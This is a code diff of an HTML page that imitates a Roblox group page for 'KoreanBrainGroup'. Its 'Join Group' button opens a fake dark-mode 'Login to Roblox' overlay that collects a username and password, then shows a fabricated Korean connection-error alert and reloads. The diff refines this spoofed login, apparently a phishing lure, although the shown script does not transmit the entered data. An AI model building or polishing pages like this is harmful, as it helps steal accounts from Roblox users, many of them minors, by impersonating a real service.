@@ -11,60 +11,57 @@
     <link rel="stylesheet" href="https://css.rbxcdn.com/9cf73d509a97a9aadb83954af92f8ed69a74d3a9b75f08f0c353301822d0aaa6-GroupDetails.css">
 
     <style>
-        /* [IMG_1400] 다크모드 로그인 화면 커스텀 */
+        /* [두 번째 사진] 로그인 화면 - 사용자님이 확인하신 그 다크모드 디자인 */
         #login-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: #191b1d; z-index: 99999; color: #fff; font-family: 'Source Sans Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #191b1d; z-index: 100000; color: #ffffff;
+            font-family: 'Source Sans Pro', sans-serif;
         }
         .login-box {
-            width: 400px; margin: 100px auto; background: #2b2d2f; padding: 40px; border-radius: 8px; text-align: center;
+            width: 90%; max-width: 400px; margin: 15% auto;
+            background: #2b2d2f; padding: 40px 30px; border-radius: 8px; text-align: center;
         }
         .login-input {
-            width: 100%; height: 44px; background: #393b3d; border: 1px solid #454749;
-            border-radius: 4px; color: #fff; margin-bottom: 12px; padding: 0 12px; box-sizing: border-box; font-size: 14px;
+            width: 100%; height: 48px; background: #393b3d; border: 1px solid #454749;
+            border-radius: 4px; color: #ffffff; margin-bottom: 12px; padding: 0 15px; font-size: 16px; box-sizing: border-box;
         }
-        .login-btn {
-            width: 100%; height: 40px; background: transparent; border: 1px solid #fff;
-            color: #fff; border-radius: 4px; font-weight: 700; cursor: pointer; margin-top: 10px;
+        .login-btn-submit {
+            width: 100%; height: 44px; background: transparent; border: 1px solid #ffffff;
+            color: #ffffff; border-radius: 4px; font-weight: 700; cursor: pointer; margin-top: 10px;
         }
-        /* 메인 화면 이미지 깨짐 방지 */
-        .group-card-logo { border-radius: 50%; border: 1px solid #dee1e3; }
     </style>
 </head>
-
-<body class="rbx-body light-theme builder-font">
+<body class="rbx-body light-theme builder-font" style="overflow-y: auto;">
     <div id="wrap" class="wrap no-gutter-ads logged-out">
-        
         <header id="header" class="navbar-fixed-top rbx-header">
             <div class="container-fluid">
                 <div class="rbx-navbar-header">
                     <div class="navbar-header"><a class="navbar-brand"><span class="icon-logo-r"></span></a></div>
                 </div>
                 <ul class="nav rbx-navbar hidden-xs hidden-sm">
-                    <li><a class="nav-menu-title">Charts</a></li>
-                    <li><a class="nav-menu-title">Marketplace</a></li>
-                    <li><a class="nav-menu-title">Create</a></li>
-                    <li><a class="nav-menu-title">Robux</a></li>
+                    <li><a class="nav-menu-title" href="#">Charts</a></li>
+                    <li><a class="nav-menu-title" href="#">Marketplace</a></li>
+                    <li><a class="nav-menu-title" href="#">Create</a></li>
+                    <li><a class="nav-menu-title" href="#">Robux</a></li>
                 </ul>
             </div>
         </header>
 
         <nav id="navigation" class="rbx-left-col">
-            <ul class="nav">
+            <ul>
                 <li class="active"><a class="nav-item"><span class="icon-nav-home"></span><span class="font-header-2">Home</span></a></li>
                 <li><a class="nav-item"><span class="icon-nav-profile"></span><span class="font-header-2">Profile</span></a></li>
                 <li><a class="nav-item"><span class="icon-nav-message"></span><span class="font-header-2">Messages</span></a></li>
                 <li><a class="nav-item"><span class="icon-nav-friends"></span><span class="font-header-2">Friends</span></a></li>
             </ul>
         </nav>
-
         <main class="container-main content">
             <div id="container-main">
                 <div class="group-details-container">
                     <div class="section-content">
                         <div class="group-header">
                             <div class="group-header-image">
-                                <img src="https://tr.rbxcdn.com/180DAY-4a5cef5da6aa52692439ad69a06e15e5/150/150/Image/Png/noFilter" class="group-card-logo" width="150" height="150">
+                                <img src="https://tr.rbxcdn.com/180DAY-4a5cef5da6aa52692439ad69a06e15e5/150/150/Image/Png/noFilter" style="width:150px; border-radius:50%; border:1px solid #dee1e3;">
                             </div>
                             <div class="group-caption">
                                 <h1 class="group-name">KoreanBrainGroup</h1>
@@ -72,7 +69,7 @@
                                 <div class="group-stats">
                                     <span class="font-caption-header">57 Members</span>
                                 </div>
-                                <div class="group-membership-container" style="margin-top: 15px;">
+                                <div class="group-membership-container" style="margin-top: 20px;">
                                     <button onclick="openLogin()" class="btn-growth-md btn-secondary-md">Join Group</button>
                                 </div>
                             </div>
@@ -98,35 +95,32 @@
     </div>
 
     <div id="login-overlay">
+        <div style="height: 44px; background: #000; display: flex; align-items: center; padding: 0 20px;">
+            <span style="font-size: 24px; cursor: pointer;" onclick="location.reload()">×</span>
+        </div>
         <div class="login-box">
-            <h1 style="font-size:30px; margin-bottom:30px; font-weight:700;">Login to Roblox</h1>
-            <input type="text" id="username" class="login-input" placeholder="Username/Email/Phone">
-            <input type="password" id="password" class="login-input" placeholder="Password">
-            <button class="login-btn" onclick="sendData()">Log In</button>
-            <div style="margin-top:25px; color:#adb0b1; font-size:14px;">
+            <h1 style="font-size: 32px; margin-bottom: 30px; font-weight: 700;">Login to Roblox</h1>
+            <input type="text" id="u" class="login-input" placeholder="Username/Email/Phone">
+            <input type="password" id="p" class="login-input" placeholder="Password">
+            <button class="login-btn-submit" onclick="submitData()">Log In</button>
+            <div style="margin-top: 25px; color: #adb0b1; font-size: 14px;">
                 <p>Forgot Password or Username?</p>
-                <div style="border-top: 1px solid #444; margin: 20px 0;"></div>
-                <button style="width:100%; height:40px; background:#393b3d; border:none; color:#fff; border-radius:4px; font-weight:600;">Quick Sign-in</button>
+                <div style="border-top: 1px solid #454749; margin: 20px 0;"></div>
+                <button style="width:100%; height:44px; background:#393b3d; border:none; color:#fff; border-radius:4px; font-weight:700;">Quick Sign-in</button>
             </div>
         </div>
     </div>
 
     <script>
-        // 메인 화면에서 로그인으로 전환하는 기능
         function openLogin() {
             document.getElementById('wrap').style.display = 'none';
             document.getElementById('login-overlay').style.display = 'block';
             window.scrollTo(0,0);
         }
-
-        function sendData() {
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            if(u && p) {
-                alert("연결 오류 (403): 나중에 다시 시도하세요.");
+        function submitData() {
+            if(document.getElementById('u').value && document.getElementById('p').value) {
+                alert("연결 오류: 서버 응답이 없습니다.");
                 location.reload();
-            } else {
-                alert("정보를 입력하세요.");
             }
         }
     </script>
